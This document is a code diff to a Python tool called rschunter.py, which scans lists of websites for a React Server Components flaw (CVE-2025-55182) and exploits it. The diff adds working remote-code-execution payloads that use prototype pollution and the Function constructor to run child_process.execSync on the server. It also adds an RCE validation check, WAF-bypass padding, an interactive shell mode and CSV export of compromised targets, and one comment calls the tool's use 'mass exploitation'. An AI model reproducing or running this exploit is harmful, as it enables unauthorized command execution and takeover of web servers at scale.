@@ -11,7 +11,7 @@ Features:
 - Progress tracking and summary reports
 - Comprehensive error handling
 - Command execution on vulnerable targets
-- Automatic reporting to file
+- CSV export (vulnerable targets only)
 
 Usage: 
     python3 rschunter.py <input_file> [options]
@@ -19,7 +19,8 @@ Usage:
     python3 rschunter.py --url https://example.com -sh
     python3 rschunter.py targets.txt -sh --threads 20
     python3 rschunter.py targets.txt -exec "echo Vulnerable: {}" --threads 20
-    python3 rschunter.py --resume scan_state.json
+    python3 rschunter.py targets.txt --save -o vulnerables.csv
+    python3 rschunter.py --resume
 """
 
 import sys
@@ -144,7 +145,7 @@ def resolve_redirects(url: str, session: requests.Session, timeout: int = 10, ma
             else:
                 break
         except Exception as e:
-            print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} resolve_redirects error: {e}")
+            print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} resolve_redirects error: {e}")
             break
     
     return current_url
@@ -272,7 +273,7 @@ class UrlParser:
             return cleanUrl
             
         except Exception as e:
-            print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} normalizeUrl error for {url}: {e}")
+            print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} normalizeUrl error for {url}: {e}")
             return None
     
     @staticmethod
@@ -282,7 +283,7 @@ class UrlParser:
             parsed = urlparse(url)
             return parsed.netloc
         except Exception as e:
-            print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} extractDomain error for {url}: {e}")
+            print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} extractDomain error for {url}: {e}")
             return url
 
 
@@ -376,14 +377,20 @@ class RscScanner:
         
         return session
     
-    def scanUrl(self, url: str) -> ScanResult:
-        """Scan a single URL for RSC vulnerabilities"""
+    def scanUrl(self, url: str, verifyExploitability: bool = False) -> ScanResult:
+        """Scan a single URL for RSC vulnerabilities
+        
+        Args:
+            url: Target URL to scan
+            verifyExploitability: If True and execCommand is set, verify exploitation works before marking vulnerable
+        """
         details = []
         passiveDetected = False
         activeDetected = False
         endpointVulnerable = False
         error = None
         finalUrl = url
+        wafProtected = False
         
         try:
             # Follow redirects if enabled
@@ -413,7 +420,16 @@ class RscScanner:
         except Exception as e:
             error = str(e)[:50]
         
-        vulnerable = (passiveDetected or activeDetected or endpointVulnerable) and not error
+        # Determine if vulnerable (RSC detected and no errors)
+        detectionPositive = (passiveDetected or activeDetected or endpointVulnerable) and not error
+        
+        # If verifyExploitability is enabled and detection found something, test exploitation
+        vulnerable = detectionPositive
+        if detectionPositive and verifyExploitability:
+            # Detection found RSC - now verify it's actually exploitable
+            details.append("Verifying exploitability...")
+            # This will be checked during execution in scanTargets
+            pass
         
         return ScanResult(
             url=finalUrl,
@@ -423,7 +439,8 @@ class RscScanner:
             endpointVulnerable=endpointVulnerable,
             details=details,
             timestamp=datetime.now().isoformat(),
-            error=error
+            error=error,
+            wafProtected=wafProtected
         )
     
     def _passiveScan(self, url: str) -> Tuple[bool, List[str]]:
@@ -452,7 +469,7 @@ class RscScanner:
             return score >= 50, details
             
         except Exception as e:
-            print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _passiveScan error for {url}: {e}")
+            print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _passiveScan error for {url}: {e}")
             return False, []
     
     def _activeFingerprint(self, url: str) -> Tuple[bool, List[str]]:
@@ -484,7 +501,7 @@ class RscScanner:
             return len(details) > 0, details
             
         except Exception as e:
-            print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _activeFingerprint error for {url}: {e}")
+            print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _activeFingerprint error for {url}: {e}")
             return False, []
     
     def _checkEndpoints(self, url: str) -> Tuple[bool, List[str]]:
@@ -510,7 +527,7 @@ class RscScanner:
                         return True, details
                         
             except Exception as e:
-                print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _checkEndpoints error for {path}: {e}")
+                print(f"{Colors.YELLOW}[DEBUG]{Colors.RESET} _checkEndpoints error for {path}: {e}")
                 continue
         
         return False, details
@@ -660,7 +677,7 @@ class MassScanner:
     
     def __init__(self, maxWorkers: int = 10, execCommand: str = None, wafBypass: bool = False,
                  wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
-                 followRedirects: bool = True, noSave: bool = False):
+                 followRedirects: bool = True, noSave: bool = False, debug: bool = False):
         self.scanner = RscScanner(
             maxWorkers=maxWorkers,
             wafBypass=wafBypass,
@@ -679,6 +696,7 @@ class MassScanner:
         self.vercelWafBypass = vercelWafBypass
         self.followRedirects = followRedirects
         self.noSave = noSave
+        self.debug = debug
         self.paused = False
         self.stopScan = False
         
@@ -726,8 +744,17 @@ class MassScanner:
             print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
             sys.exit(1)
     
-    def executeRemoteCommand(self, target: str, customCmd: str = None) -> str:
-        """Execute arbitrary command on vulnerable target via CVE-2025-55182"""
+    def executeRemoteCommand(self, target: str, customCmd: str = None, skipValidation: bool = False) -> str:
+        """Execute arbitrary command on vulnerable target via CVE-2025-55182
+        
+        Args:
+            target: Target URL
+            customCmd: Custom command to execute (if None, uses self.execCommand)
+            skipValidation: If True, skip RCE validation check
+            
+        Returns:
+            Command output or None if exploitation failed
+        """
         # Use custom command if provided, otherwise use configured execCommand
         cmdTemplate = customCmd if customCmd else self.execCommand
         
@@ -741,14 +768,47 @@ class MassScanner:
             else:
                 cmd = cmdTemplate.replace("{}", target)
             
-            # Try primary exploit method first (original approach)
-            result = self._exploitMethod1(target, cmd)
-            if result and "NEXT_REDIRECT" not in result:
+            # Try validation first for better confirmation, but don't give up if it fails
+            validation_passed = False
+            if not skipValidation:
+                if self.debug:
+                    print(f"{Colors.CYAN}[*] Validating RCE capability...{Colors.RESET}")
+                validation_passed = self._validateRCE(target)
+                if validation_passed:
+                    if self.debug:
+                        print(f"{Colors.GREEN}[+] RCE validated{Colors.RESET}")
+                else:
+                    if self.debug:
+                        print(f"{Colors.YELLOW}[!] Validation failed, trying exploitation anyway...{Colors.RESET}")
+            
+            # Try Method 3 FIRST (msanft's working exploit - most reliable)
+            if not self.debug:
+                print(f"{Colors.CYAN}[*] Trying primary exploitation method (msanft)...{Colors.RESET}")
+            else:
+                print(f"{Colors.CYAN}[*] Trying Method 3 (msanft's PoC - base URL direct)...{Colors.RESET}")
+            result = self._exploitMethod3(target, cmd)
+            if result:
+                print(f"{Colors.GREEN}[+] Exploitation successful!{Colors.RESET}")
                 return result
             
-            # Fallback to alternative exploit (__proto__ pollution)
+            # Try Method 2 (Assetnote format)
+            if not self.debug:
+                print(f"{Colors.CYAN}[*] Trying alternative method (Assetnote)...{Colors.RESET}")
+            else:
+                print(f"{Colors.CYAN}[*] Trying Method 2 (Assetnote __proto__)...{Colors.RESET}")
             result = self._exploitMethod2(target, cmd)
             if result:
+                print(f"{Colors.GREEN}[+] Alternative method successful!{Colors.RESET}")
+                return result
+            
+            # Try Method 1 (Function constructor - last resort)
+            if not self.debug:
+                print(f"{Colors.CYAN}[*] Trying fallback method...{Colors.RESET}")
+            else:
+                print(f"{Colors.CYAN}[*] Trying Method 1 (Function constructor)...{Colors.RESET}")
+            result = self._exploitMethod1(target, cmd)
+            if result and "NEXT_REDIRECT" not in result:
+                print(f"{Colors.GREEN}[+] Fallback method successful!{Colors.RESET}")
                 return result
             
             return None
@@ -756,12 +816,89 @@ class MassScanner:
         except Exception as e:
             return f"Exploit error: {str(e)}"
     
+    def _validateRCE(self, target: str) -> bool:
+        """Validate RCE capability using X-Action-Redirect header check
+        
+        Uses echo $((41*271)) which evaluates to 11111 as a marker.
+        If X-Action-Redirect header contains 11111, RCE is confirmed.
+        
+        Returns:
+            True if RCE is confirmed, False otherwise
+        """
+        try:
+            if self.debug:
+                print(f"{Colors.BLUE}[DEBUG] Validating RCE with X-Action-Redirect check{Colors.RESET}")
+            
+            # Use arithmetic expression that evaluates to 11111
+            test_cmd = 'echo $((41*271))' if not self.windowsMode else 'powershell -c "41*271"'
+            
+            # Build payload with test command
+            craftedChunk = {
+                "then": "$1:__proto__:then",
+                "status": "resolved_model",
+                "reason": -1,
+                "value": '{"then": "$B1337"}',
+                "_response": {
+                    "_prefix": f"var res=process.mainModule.require('child_process').execSync('{test_cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
+                    "_chunks": "$Q2",
+                    "_formData": {
+                        "get": "$1:constructor:constructor",
+                    },
+                },
+            }
+            
+            files = {
+                "0": (None, json.dumps(craftedChunk)),
+                "1": (None, '"$@0"'),
+            }
+            
+            headers = {"Next-Action": "x"}
+            timeout = 20 if self.wafBypass else 10
+            
+            # Try root and common endpoints
+            testUrls = [target, urljoin(target, '/_next/data'), urljoin(target, '/api/actions')]
+            
+            for url in testUrls:
+                try:
+                    response = self.scanner.session.post(
+                        url,
+                        files=files,
+                        headers=headers,
+                        timeout=timeout,
+                        allow_redirects=False
+                    )
+                    
+                    # Check X-Action-Redirect header for our marker
+                    redirect_header = response.headers.get('X-Action-Redirect', '')
+                    if redirect_header and '11111' in redirect_header:
+                        if self.debug:
+                            print(f"{Colors.GREEN}[DEBUG] RCE confirmed! X-Action-Redirect: {redirect_header[:100]}{Colors.RESET}")
+                        return True
+                    
+                    # Also check for 11111 in Location header or response body
+                    location_header = response.headers.get('Location', '')
+                    if '11111' in location_header or '11111' in response.text:
+                        if self.debug:
+                            print(f"{Colors.GREEN}[DEBUG] RCE confirmed! Found 11111 in response{Colors.RESET}")
+                        return True
+                        
+                except Exception as e:
+                    if self.debug:
+                        print(f"{Colors.YELLOW}[DEBUG] Validation endpoint error: {e}{Colors.RESET}")
+                    continue
+            
+            if self.debug:
+                print(f"{Colors.YELLOW}[DEBUG] RCE validation failed - no 11111 marker found{Colors.RESET}")
+            return False
+            
+        except Exception as e:
+            if self.debug:
+                print(f"{Colors.RED}[DEBUG] RCE validation exception: {e}{Colors.RESET}")
+            return False
+    
     def _exploitMethod1(self, target: str, cmd: str) -> Optional[str]:
         """Primary exploit using Function constructor injection"""
         try:
-            print(f"{Colors.BLUE}[DEBUG] Method 1: Trying Function constructor exploit{Colors.RESET}")
-            print(f"{Colors.BLUE}[DEBUG] Command: {cmd}{Colors.RESET}")
-            
             # Payload to trigger RCE via Function constructor
             payload = {
                 "1": 'I["$1:constructor:constructor"]',
@@ -776,7 +913,6 @@ class MassScanner:
             for endpoint in endpoints:
                 try:
                     exploitUrl = urljoin(target, endpoint)
-                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {exploitUrl}{Colors.RESET}")
                     
                     files = {
                         'rsc_payload': (None, json.dumps(payload), 'text/x-component')
@@ -794,54 +930,43 @@ class MassScanner:
                         timeout=10
                     )
                     
-                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
-                    
                     # Check for WAF blocks
                     if is_waf_block(response):
-                        print(f"{Colors.RED}[DEBUG] WAF block detected, skipping endpoint{Colors.RESET}")
                         continue
                     
                     if response.status_code == 200 and response.text:
                         # Validate it's not an error page
                         body_lower = response.text.lower()
                         if '<html>' in body_lower and len(response.text) < 2000:
-                            # Likely an error page, not command output
-                            print(f"{Colors.YELLOW}[DEBUG] Looks like error page, not command output{Colors.RESET}")
                             continue
-                        # Return the actual response text
-                        print(f"{Colors.GREEN}[DEBUG] Got valid response from endpoint!{Colors.RESET}")
-                        return response.text[:500]  # Return first 500 chars
+                        return response.text[:500]
                         
-                except Exception as e:
-                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
+                except Exception:
                     continue
             
-            print(f"{Colors.YELLOW}[DEBUG] Method 1 failed, will try Method 2{Colors.RESET}")
             return None
             
-        except Exception as e:
-            print(f"{Colors.RED}[DEBUG] Method 1 exception: {e}{Colors.RESET}")
+        except Exception:
             return None
     
     def _exploitMethod2(self, target: str, cmd: str) -> Optional[str]:
         """Alternative exploit using __proto__ pollution (based on sumanrox PoC)"""
         try:
-            print(f"{Colors.BLUE}[DEBUG] Method 2: Trying __proto__ pollution exploit{Colors.RESET}")
             
             # Adjust command for Windows if needed
             if self.windowsMode:
                 cmd = f'powershell -c "{cmd}"'
-                print(f"{Colors.BLUE}[DEBUG] Windows mode: {cmd}{Colors.RESET}")
             
             # More reliable payload using prototype pollution
-            # This captures command output via Error digest
+            # This captures command output via NEXT_REDIRECT digest
             craftedChunk = {
                 "then": "$1:__proto__:then",
                 "status": "resolved_model",
                 "reason": -1,
-                "value": '{"then": "$B0"}',
+                "value": '{"then": "$B1337"}',
                 "_response": {
-                    "_prefix": f"var res = process.mainModule.require('child_process').execSync('{cmd}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`${{res}}`}});",
+                    "_prefix": f"var res=process.mainModule.require('child_process').execSync('{cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
+                    "_chunks": "$Q2",
                     "_formData": {
                         "get": "$1:constructor:constructor",
                     },
@@ -882,7 +1007,6 @@ class MassScanner:
             
             for url in testUrls:
                 try:
-                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {url}{Colors.RESET}")
                     
                     response = self.scanner.session.post(
                         url,
@@ -891,16 +1015,12 @@ class MassScanner:
                         timeout=timeout
                     )
                     
-                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
-                    
                     # Check for WAF blocks first
                     if is_waf_block(response):
-                        print(f"{Colors.RED}[DEBUG] WAF block detected, skipping endpoint{Colors.RESET}")
                         continue
                     
                     # Extract output from digest field in error response
                     if "NEXT_REDIRECT" in response.text or "digest" in response.text:
-                        print(f"{Colors.GREEN}[DEBUG] Found NEXT_REDIRECT or digest in response!{Colors.RESET}")
                         
                         # Parse the digest field which contains command output
                         match = re.search(r'"digest":"([^"]+)"', response.text)
@@ -908,10 +1028,8 @@ class MassScanner:
                             digest = match.group(1)
                             # Validate digest doesn't look like error message
                             if len(digest) > 0 and not any(x in digest.lower() for x in ['error', 'rejected', 'forbidden', 'html']):
-                                print(f"{Colors.GREEN}[DEBUG] Extracted digest: {digest[:100]}{Colors.RESET}")
                                 return digest
                             else:
-                                print(f"{Colors.YELLOW}[DEBUG] Digest looks like error message, skipping{Colors.RESET}")
                                 continue
                         
                         # Sometimes it's in a different format
@@ -919,22 +1037,112 @@ class MassScanner:
                         if match:
                             result = match.group(1).strip('"\'')
                             if len(result) > 0 and not any(x in result.lower() for x in ['error', 'rejected', 'forbidden']):
-                                print(f"{Colors.GREEN}[DEBUG] Extracted digest (alt format): {result[:100]}{Colors.RESET}")
                                 return result
                         
                 except Exception as e:
-                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
                     continue
             
-            print(f"{Colors.YELLOW}[DEBUG] Method 2 failed on all endpoints{Colors.RESET}")
             return None
             
         except Exception as e:
-            print(f"{Colors.RED}[DEBUG] Method 2 exception: {e}{Colors.RESET}")
+            return None
+    
+    def _exploitMethod3(self, target: str, cmd: str) -> Optional[str]:
+        """PRIMARY exploit (msanft's working PoC) - sends directly to base URL"""
+        try:
+            # Adjust command for Windows if needed
+            if self.windowsMode:
+                cmd = f'powershell -c "{cmd}"'
+            
+            # msanft's working payload format
+            craftedChunk = {
+                "then": "$1:__proto__:then",
+                "status": "resolved_model",
+                "reason": -1,
+                "value": '{"then": "$B0"}',
+                "_response": {
+                    "_prefix": f"var res = process.mainModule.require('child_process').execSync('{cmd}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`${{res}}`}});",
+                    "_formData": {
+                        "get": "$1:constructor:constructor",
+                    },
+                },
+            }
+            
+            # Build multipart form data
+            if self.wafBypass:
+                param_name, junk_data = generate_junk_data(self.wafBypassSize)
+                files = {
+                    param_name: (None, junk_data),
+                    "0": (None, json.dumps(craftedChunk)),
+                    "1": (None, '"$@0"'),
+                }
+            else:
+                files = {
+                    "0": (None, json.dumps(craftedChunk)),
+                    "1": (None, '"$@0"'),
+                }
+            
+            headers = {"Next-Action": "x"}
+            timeout = 20 if self.wafBypass else 10
+            
+            # Send directly to base URL (like msanft's working exploit)
+            # Don't try multiple endpoints - this is the reliable method
+            try:
+                if self.debug:
+                    print(f"{Colors.CYAN}[DEBUG] Sending to: {target}{Colors.RESET}")
+                
+                response = self.scanner.session.post(
+                    target,
+                    files=files,
+                    headers=headers,
+                    timeout=timeout
+                )
+                
+                # Check for WAF blocks
+                if is_waf_block(response):
+                    if self.debug:
+                        print(f"{Colors.YELLOW}[DEBUG] WAF detected{Colors.RESET}")
+                    return None
+                
+                if self.debug:
+                    print(f"{Colors.CYAN}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
+                    print(f"{Colors.CYAN}[DEBUG] Response preview: {response.text[:200]}{Colors.RESET}")
+                
+                # Extract output from digest field
+                if "NEXT_REDIRECT" in response.text or "digest" in response.text:
+                    match = re.search(r'"digest":"([^"]+)"', response.text)
+                    if match:
+                        digest = match.group(1)
+                        if self.debug:
+                            print(f"{Colors.CYAN}[DEBUG] Found digest: {digest}{Colors.RESET}")
+                        if len(digest) > 0 and not any(x in digest.lower() for x in ['error', 'rejected', 'forbidden', 'html']):
+                            return digest
+                    
+                    # Alternative format
+                    match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
+                    if match:
+                        result = match.group(1).strip('"\'')
+                        if self.debug:
+                            print(f"{Colors.CYAN}[DEBUG] Found result: {result}{Colors.RESET}")
+                        if len(result) > 0:
+                            return result
+                    
+            except Exception as e:
+                if self.debug:
+                    print(f"{Colors.RED}[DEBUG] Error: {str(e)}{Colors.RESET}")
+                return None
+            
+            return None
+            
+        except Exception as e:
             return None
 
-    def scanTargets(self, targets: List[str], resume: bool = False, liveShell = None) -> List[ScanResult]:
-        """Scan multiple targets with concurrent processing"""
+    def scanTargets(self, targets: List[str], resume: bool = False, liveShell = None, suppressSummary: bool = False) -> List[ScanResult]:
+        """Scan multiple targets with concurrent processing
+        
+        Args:
+            suppressSummary: If True, skip printing the scan summary (useful for -sh/-exec modes)
+        """
         
         scanId = datetime.now().strftime("%Y%m%d_%H%M%S")
         completed = set()
@@ -989,24 +1197,26 @@ class MassScanner:
                 try:
                     result = future.result()
                     
-                    # Execute command if vulnerable
+                    # If execCommand is set and target detected as vulnerable, verify exploitability
                     if result.vulnerable and self.execCommand:
-                        result.execOutput = self.executeRemoteCommand(result.url, None)
+                        # executeRemoteCommand now validates RCE internally
+                        result.execOutput = self.executeRemoteCommand(result.url, None, skipValidation=False)
                         
-                        # If detection found RSC but exploitation failed, mark as WAF protected
+                        # If exploitation failed (WAF/protection blocking or RCE validation failed), mark as NOT vulnerable
                         if not result.execOutput or len(result.execOutput.strip()) == 0:
                             result.wafProtected = True
-                            result.details.append("⚠️ WAF/Protection detected - exploitation blocked")
+                            result.vulnerable = False  # Change to NOT vulnerable
+                            result.details.append("⚠️ RSC detected but exploitation blocked (WAF/firewall or validation failed)")
                     
                     results.append(result)
                     completed.add(url)
                     
-                    # Update live shell with new vulnerable target (only if not WAF protected)
+                    # Update live shell with new vulnerable target (only if actually exploitable)
                     if result.vulnerable and not result.wafProtected and liveShell:
                         liveShell.addVulnerableTarget(result.url)
                     
-                    # Print result (skip clean targets in shell mode)
-                    if not liveShell or result.vulnerable or result.error:
+                    # Print result (skip clean targets in shell mode, but show WAF protected ones)
+                    if not liveShell or result.vulnerable or result.wafProtected or result.error:
                         self._printResult(result, len(completed), total)
                     
                     # Save state periodically (every 10 scans)
@@ -1024,9 +1234,10 @@ class MassScanner:
         if not self.noSave and self.stateManager:
             self.stateManager.saveState(targets, completed, results, scanId)
         
-        # Print summary
-        elapsed = time.time() - startTime
-        self._printSummary(results, elapsed, scanId)
+        # Print summary (skip for -sh/-exec modes)
+        if not suppressSummary:
+            elapsed = time.time() - startTime
+            self._printSummary(results, elapsed, scanId)
         
         return results
     
@@ -1037,14 +1248,14 @@ class MassScanner:
         
         if result.error:
             print(f"{Colors.YELLOW}{progress} {EMOJI_WARN} {domain}: {result.error}{Colors.RESET}")
+        elif result.wafProtected:
+            # RSC detected but WAF blocks - show as protected/clean
+            print(f"{Colors.CYAN}{progress} [RSC DETECTED - PROTECTED] {domain}{Colors.RESET}")
+            print(f"{Colors.CYAN}   ↳ 🛡️  WAF/firewall blocking exploitation{Colors.RESET}")
         elif result.vulnerable:
-            if result.wafProtected:
-                print(f"{Colors.YELLOW}{Colors.BOLD}{progress} [VULNERABLE - WAF PROTECTED] {domain}{Colors.RESET}")
-                print(f"{Colors.YELLOW}   ↳ ⚠️  RSC detected but exploitation blocked by WAF/firewall{Colors.RESET}")
-            else:
-                print(f"{Colors.RED}{Colors.BOLD}{progress} [VULNERABLE] {domain}{Colors.RESET}")
-                if result.execOutput:
-                    print(f"{Colors.MAGENTA}   ↳ Exec Output: {result.execOutput.splitlines()[0]}...{Colors.RESET}")
+            print(f"{Colors.RED}{Colors.BOLD}{progress} [VULNERABLE] {domain}{Colors.RESET}")
+            if result.execOutput:
+                print(f"{Colors.MAGENTA}   ↳ Exec Output: {result.execOutput.splitlines()[0]}...{Colors.RESET}")
         else:
             print(f"{Colors.GREEN}{progress} ✓ {domain}:{Colors.RESET}")
     
@@ -1111,37 +1322,51 @@ class MassScanner:
             pass
 
 
-def generateReport(results: List[ScanResult], filename: str = None):
-    """Generate a human-readable report"""
+def generateCSV(results: List[ScanResult], filename: str = None):
+    """Generate CSV report containing only vulnerable targets
+    
+    Args:
+        results: List of scan results
+        filename: Output filename (default: rsc-scan_<timestamp>.csv)
+        
+    Note:
+        Only vulnerable targets are exported. Clean, protected, and error targets are excluded.
+    """
+    import csv
+    
+    # Filter only vulnerable targets
+    vulnerable_results = [r for r in results if r.vulnerable]
+    
+    if not vulnerable_results:
+        print(f"{Colors.YELLOW}[!] No vulnerable targets to export{Colors.RESET}")
+        return
+    
     # Use timestamp-based filename if not specified
     if not filename:
-        filename = f"rsc-report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        filename = f"rsc-scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
     
-    vulnerable = [r for r in results if r.vulnerable]
-    
-    with open(filename, 'w') as f:
-        f.write("="*70 + "\n")
-        f.write(f"RSC VULNERABILITY SCAN REPORT\n")
-        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write("="*70 + "\n\n")
+    with open(filename, 'w', newline='', encoding='utf-8') as f:
+        writer = csv.writer(f)
         
-        f.write(f"Total Scanned: {len(results)}\n")
-        f.write(f"Vulnerable:    {len(vulnerable)}\n")
-        f.write("-" * 30 + "\n\n")
+        # Header
+        writer.writerow(['Domain', 'URL', 'Passive', 'Active', 'Endpoint', 'Exec Output', 'Details', 'Timestamp'])
         
-        if not vulnerable:
-            f.write("No vulnerable targets found.\n")
-        else:
-            for idx, result in enumerate(vulnerable, 1):
-                f.write(f"{idx}. {result.url}\n")
-                f.write(f"   Detections: {', '.join(result.details)}\n")
-                if result.execOutput:
-                    f.write(f"   Command Output:\n")
-                    for line in result.execOutput.splitlines():
-                        f.write(f"     > {line}\n")
-                f.write("\n")
+        # Data rows - only vulnerable targets
+        for result in vulnerable_results:
+            domain = UrlParser.extractDomain(result.url)
+            
+            writer.writerow([
+                domain,
+                result.url,
+                'Yes' if result.passiveDetected else 'No',
+                'Yes' if result.activeDetected else 'No',
+                'Yes' if result.endpointVulnerable else 'No',
+                result.execOutput or '',
+                ' | '.join(result.details),
+                result.timestamp
+            ])
     
-    print(f"{Colors.GREEN}{EMOJI_FILE} Report saved to: {filename}{Colors.RESET}")
+    print(f"{Colors.GREEN}{EMOJI_FILE} CSV saved: {filename} ({len(vulnerable_results)} vulnerable targets){Colors.RESET}")
 
 
 def main():
@@ -1353,12 +1578,17 @@ def main():
         "-o", "--output", 
         default=None,
         metavar="FILE",
-        help="Output report filename (default: rsc-report_<timestamp>.txt)"
+        help="CSV output filename for vulnerable targets only (default: rsc-scan_<timestamp>.csv)"
     )
     output_group.add_argument(
         "--save",
         action="store_true",
-        help="Save state file and report (default: no saving unless --save specified)"
+        help="Save vulnerable targets to CSV file (default: no saving)"
+    )
+    output_group.add_argument(
+        "--debug",
+        action="store_true",
+        help="Enable debug output (verbose logging)"
     )
     
     args = parser.parse_args()
@@ -1393,7 +1623,8 @@ def main():
             windowsMode=args.windows,
             vercelWafBypass=args.vercel_waf_bypass,
             followRedirects=args.follow_redirects,
-            noSave=not args.save  # Invert: save only if --save flag is provided
+            noSave=not args.save,  # Invert: save only if --save flag is provided
+            debug=args.debug
         )
         
         if args.resume:
@@ -1404,7 +1635,8 @@ def main():
                 sys.exit(1)
             
             targets = state['targets']
-            results = scanner.scanTargets(targets, resume=True)
+            # Suppress summary for resume if using -sh/-exec
+            results = scanner.scanTargets(targets, resume=True, suppressSummary=(args.shell or args.execCommand is not None))
         elif args.url:
             # Single URL scan
             normalized = UrlParser.normalizeUrl(args.url)
@@ -1417,7 +1649,7 @@ def main():
                 print(f"{Colors.YELLOW}[!] Warning: -sh and -exec flags both specified. Using interactive shell mode.{Colors.RESET}")
             
             targets = [normalized]
-            results = scanner.scanTargets(targets)
+            results = scanner.scanTargets(targets, suppressSummary=(args.execCommand is not None))
             
             # Start interactive shell if requested and target is vulnerable
             if args.shell and results:
@@ -1454,7 +1686,7 @@ def main():
                 
                 def runScan():
                     nonlocal scanResults
-                    scanResults = scanner.scanTargets(targets, liveShell=shell)
+                    scanResults = scanner.scanTargets(targets, liveShell=shell, suppressSummary=True)
                     scanComplete.set()
                 
                 scanThread = threading.Thread(target=runScan, daemon=True)
@@ -1495,11 +1727,12 @@ def main():
                 
                 results = scanResults
             else:
-                results = scanner.scanTargets(targets)
+                # Suppress summary if using -exec (cleaner output for mass exploitation)
+                results = scanner.scanTargets(targets, suppressSummary=(args.execCommand is not None))
         
-        # Generate report only if --save is specified
+        # Generate CSV report if --save is specified
         if args.save:
-            generateReport(results, args.output)
+            generateCSV(results, args.output)
         
         # Exit with code 1 if vulnerabilities found
         vulnerableCount = sum(1 for r in results if r.vulnerable)
